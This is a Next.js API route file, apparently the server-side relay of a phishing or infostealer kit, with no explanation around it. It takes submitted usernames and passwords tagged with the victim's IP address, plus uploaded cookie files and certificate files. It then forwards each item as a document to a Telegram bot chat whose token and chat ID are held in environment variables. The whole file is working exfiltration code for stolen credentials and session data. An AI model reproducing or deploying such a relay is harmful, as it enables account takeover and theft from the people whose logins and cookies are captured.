// pages/api/relay.js
import multer from "multer";
import nextConnect from "next-connect";

const upload = multer(); // for multipart/form-data

const handler = nextConnect();

// parse JSON bodies & form-data
handler.use(upload.single("file"));
handler.use((req, res, next) => {
  // express.json & urlencoded equivalents
  if (req.headers["content-type"]?.includes("application/json")) {
    let buf = "";
    req.on("data", chunk => buf += chunk);
    req.on("end", () => {
      req.body = JSON.parse(buf);
      next();
    });
  } else {
    next();
  }
});

handler.post(async (req, res) => {
  const { ip, type } = req.body;

  const telegramToken = process.env.TELEGRAM_TOKEN;
  const chatId        = process.env.TELEGRAM_CHAT_ID;
  const apiUrl        = `https://api.telegram.org/bot${telegramToken}/sendDocument`;

  // Build a FormData for Telegram sendDocument
  const tgForm = new FormData();
  tgForm.append("chat_id", chatId);

  if (type === "creds") {
    // credentials still come as JSON body
    const { user, pass } = req.body;
    const text = `🔑 Credentials from ${ip}:\nUser: ${user}\nPass: ${pass}`;
    tgForm.append("document", new Blob([text], {type:"text/plain"}), `${ip}-CREDS.txt`);
  } else if (type === "cookie-file" && req.file) {
    // file was uploaded under field "file"
    tgForm.append("document", req.file.buffer, req.file.originalname);
  } else if (type === "cert-file" && req.file) {
    tgForm.append("document", req.file.buffer, req.file.originalname);
  } else {
    return res.status(400).json({success:false, message:"Bad payload"});
  }

  // send to Telegram
  const tgRes = await fetch(apiUrl, {
    method: "POST",
    body: tgForm
  });

  if (!tgRes.ok) {
    const err = await tgRes.text();
    console.error("Telegram sendDocument error:", err);
    return res.status(502).json({success:false, message:"Telegram error", details:err});
  }

  res.status(200).json({success:true});
});

export default handler;

export const config = {
  api: { bodyParser: false }
};
